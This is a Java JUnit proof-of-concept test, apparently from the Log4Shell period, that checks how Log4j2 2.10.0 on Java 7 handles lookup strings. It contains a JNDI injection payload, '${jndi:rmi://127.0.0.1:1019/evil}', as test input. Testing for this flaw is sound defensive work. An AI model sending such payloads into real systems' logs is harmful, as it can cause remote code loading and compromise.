package cn.burningbright.poc;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.junit.Assert;
import org.junit.Rule;
import org.junit.Test;
import org.junit.rules.TestName;

import java.io.BufferedOutputStream;
import java.io.ByteArrayOutputStream;
import java.io.OutputStream;

/**
 * @author chenguang.lin
 * @date 2021-12-16
 */
public class Java7Tester {

    @Rule
    public TestName testName = new TestName();

    private String getName(final OutputStream out) {
        return out.getClass().getSimpleName() + "." + testName.getMethodName();
    }

    /**
     * java:   1.7.0_80-b15
     * log4j2: 2.10.0
     */
    @Test
    public void log4j2() {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        OutputStream os = new BufferedOutputStream(out);
        String name = getName(out);
        ConfigurationTestUtils.addAppender(os, name, "log4j2.xml");
        Logger logger = LogManager.getLogger(name);

        // java lookup
        String exp = "${java:runtime} - ${java:vm} - ${java:os}";
        logger.info("hello {}", exp);
        String actual = out.toString();
        Assert.assertFalse(actual, actual.contains(exp));

        // jndi lookup
        String rmi = "${jndi:rmi://127.0.0.1:1019/evil}";
        logger.info("remote {}", rmi);
        actual = out.toString();
        Assert.assertTrue(actual, actual.contains(rmi));
    }

}
